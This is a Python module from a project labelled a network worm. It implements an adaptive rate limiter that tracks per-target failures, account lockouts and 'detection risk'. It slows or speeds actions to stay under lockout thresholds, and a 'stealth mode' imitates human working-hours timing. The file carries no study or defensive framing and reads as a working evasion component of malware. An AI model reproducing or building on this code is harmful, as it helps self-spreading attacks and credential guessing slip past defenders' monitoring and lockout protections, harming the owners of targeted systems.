"""
Wormy ML Network Worm - Adaptive Rate Limiter
Intelligent rate limiting that adapts based on target responsiveness,
detection risk, and network conditions.
"""

import threading
import time
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

from utils.logger import logger


@dataclass
class TargetState:
    """State tracking for a single target"""

    ip: str
    last_action_time: float = 0.0
    action_count: int = 0
    failure_count: int = 0
    success_count: int = 0
    avg_response_time: float = 0.0
    detection_risk: float = 0.0
    current_delay: float = 1.0
    lockout_until: float = 0.0


class AdaptiveRateLimiter:
    """
    Intelligent rate limiter that adapts to target behavior.

    Features:
    - Per-target rate limiting
    - Adaptive delay based on response times
    - Lockout detection and backoff
    - Network-wide rate limiting
    - Detection risk scoring
    - Stealth mode with human-like timing
    """

    def __init__(
        self,
        base_delay: float = 1.0,
        max_delay: float = 300.0,
        min_delay: float = 0.1,
        max_actions_per_minute: float = 10.0,
        lockout_threshold: int = 5,
        lockout_duration: float = 300.0,
        stealth_mode: bool = False,
    ):
        self.base_delay = base_delay
        self.max_delay = max_delay
        self.min_delay = min_delay
        self.max_actions_per_minute = max_actions_per_minute
        self.lockout_threshold = lockout_threshold
        self.lockout_duration = lockout_duration
        self.stealth_mode = stealth_mode

        self._lock = threading.RLock()
        self._targets: Dict[str, TargetState] = {}
        self._global_action_times: List[float] = []
        self._network_risk = 0.0

        logger.info(
            f"AdaptiveRateLimiter initialized: base={base_delay}s, "
            f"max={max_delay}s, stealth={stealth_mode}"
        )

    def get_delay(self, target_ip: str) -> float:
        """
        Calculate the appropriate delay before next action on target.

        Returns delay in seconds.
        """
        with self._lock:
            state = self._get_or_create_target(target_ip)

            # Check lockout
            if state.lockout_until > time.time():
                remaining = state.lockout_until - time.time()
                logger.debug(f"Target {target_ip} locked out for {remaining:.1f}s")
                return remaining

            # Calculate base delay
            delay = self._calculate_adaptive_delay(state)

            # Apply stealth mode multiplier
            if self.stealth_mode:
                delay *= self._stealth_multiplier()

            # Apply network risk multiplier
            delay *= (1.0 + self._network_risk)

            # Clamp to bounds
            delay = max(self.min_delay, min(delay, self.max_delay))

            state.current_delay = delay
            return delay

    def record_action(
        self,
        target_ip: str,
        success: bool,
        response_time: float = 0.0,
    ) -> None:
        """Record an action on a target for rate limiting calculations"""
        with self._lock:
            state = self._get_or_create_target(target_ip)

            now = time.time()
            state.last_action_time = now
            state.action_count += 1

            if success:
                state.success_count += 1
                state.detection_risk = max(0.0, state.detection_risk - 0.05)
            else:
                state.failure_count += 1
                state.detection_risk = min(1.0, state.detection_risk + 0.15)

                # Check for lockout
                if state.failure_count >= self.lockout_threshold:
                    state.lockout_until = now + self.lockout_duration
                    logger.warning(
                        f"Target {target_ip} locked out "
                        f"({state.failure_count} failures, "
                        f"{self.lockout_duration:.0f}s cooldown)"
                    )

            # Update average response time
            if response_time > 0:
                n = state.action_count
                state.avg_response_time = (
                    (state.avg_response_time * (n - 1) + response_time) / n
                )

            # Track global actions
            self._global_action_times.append(now)
            self._cleanup_global_times()

            # Update network risk
            self._update_network_risk()

    def record_detection(self, target_ip: str, severity: float = 0.5) -> None:
        """Record a detection event for a target"""
        with self._lock:
            state = self._get_or_create_target(target_ip)
            state.detection_risk = min(1.0, state.detection_risk + severity)

            # Increase lockout duration for detected targets
            state.lockout_until = time.time() + (self.lockout_duration * 2)
            state.failure_count += 3  # Penalty

            logger.warning(
                f"Detection event on {target_ip}: "
                f"risk={state.detection_risk:.2f}, "
                f"lockout extended"
            )

    def get_target_state(self, target_ip: str) -> Optional[Dict]:
        """Get the current state of a target"""
        with self._lock:
            state = self._targets.get(target_ip)
            if not state:
                return None

            return {
                "ip": state.ip,
                "action_count": state.action_count,
                "success_count": state.success_count,
                "failure_count": state.failure_count,
                "success_rate": state.success_count / max(state.action_count, 1),
                "avg_response_time": state.avg_response_time,
                "detection_risk": state.detection_risk,
                "current_delay": state.current_delay,
                "is_locked_out": state.lockout_until > time.time(),
                "lockout_remaining": max(0, state.lockout_until - time.time()),
            }

    def get_network_summary(self) -> Dict:
        """Get a summary of network-wide rate limiting state"""
        with self._lock:
            total_actions = sum(s.action_count for s in self._targets.values())
            total_failures = sum(s.failure_count for s in self._targets.values())
            locked_out = sum(
                1 for s in self._targets.values() if s.lockout_until > time.time()
            )
            high_risk = sum(
                1 for s in self._targets.values() if s.detection_risk > 0.7
            )

            return {
                "total_targets": len(self._targets),
                "total_actions": total_actions,
                "total_failures": total_failures,
                "failure_rate": total_failures / max(total_actions, 1),
                "locked_out_targets": locked_out,
                "high_risk_targets": high_risk,
                "network_risk": self._network_risk,
                "actions_per_minute": self._get_current_apm(),
                "stealth_mode": self.stealth_mode,
            }

    def reset_target(self, target_ip: str) -> None:
        """Reset rate limiting state for a target"""
        with self._lock:
            if target_ip in self._targets:
                del self._targets[target_ip]
                logger.debug(f"Rate limiter state reset for {target_ip}")

    def _get_or_create_target(self, target_ip: str) -> TargetState:
        """Get or create target state"""
        if target_ip not in self._targets:
            self._targets[target_ip] = TargetState(ip=target_ip)
        return self._targets[target_ip]

    def _calculate_adaptive_delay(self, state: TargetState) -> float:
        """Calculate adaptive delay based on target state"""
        delay = self.base_delay

        # Failure-based backoff (exponential)
        if state.failure_count > 0:
            delay *= 2 ** min(state.failure_count, 6)

        # Response time adjustment
        if state.avg_response_time > 0:
            # Slow targets get more time between actions
            if state.avg_response_time > 5.0:
                delay *= 1.5
            elif state.avg_response_time > 2.0:
                delay *= 1.2

        # Success rate adjustment
        if state.action_count > 5:
            success_rate = state.success_count / state.action_count
            if success_rate > 0.8:
                delay *= 0.8  # Speed up for successful targets
            elif success_rate < 0.3:
                delay *= 1.5  # Slow down for failing targets

        # Detection risk adjustment
        if state.detection_risk > 0.5:
            delay *= 1.0 + state.detection_risk
        if state.detection_risk > 0.8:
            delay *= 2.0  # Double delay for high risk

        return delay

    def _stealth_multiplier(self) -> float:
        """Calculate stealth mode timing multiplier"""
        import random

        # Human-like timing: actions during work hours, slower at night
        from datetime import datetime

        hour = datetime.now().hour
        if 9 <= hour <= 17:  # Work hours
            multiplier = random.uniform(0.8, 1.5)
        elif 6 <= hour <= 22:  # Extended hours
            multiplier = random.uniform(1.0, 2.0)
        else:  # Night hours
            multiplier = random.uniform(2.0, 5.0)

        return multiplier

    def _cleanup_global_times(self) -> None:
        """Remove action times older than 1 minute"""
        cutoff = time.time() - 60.0
        self._global_action_times = [
            t for t in self._global_action_times if t > cutoff
        ]

    def _get_current_apm(self) -> float:
        """Get current actions per minute"""
        return len(self._global_action_times)

    def _update_network_risk(self) -> None:
        """Update network-wide risk score"""
        if not self._targets:
            self._network_risk = 0.0
            return

        # Network risk is average of all target risks
        total_risk = sum(s.detection_risk for s in self._targets.values())
        self._network_risk = total_risk / len(self._targets)

        # Increase risk if APM is too high
        apm = self._get_current_apm()
        if apm > self.max_actions_per_minute:
            self._network_risk = min(1.0, self._network_risk + 0.1)
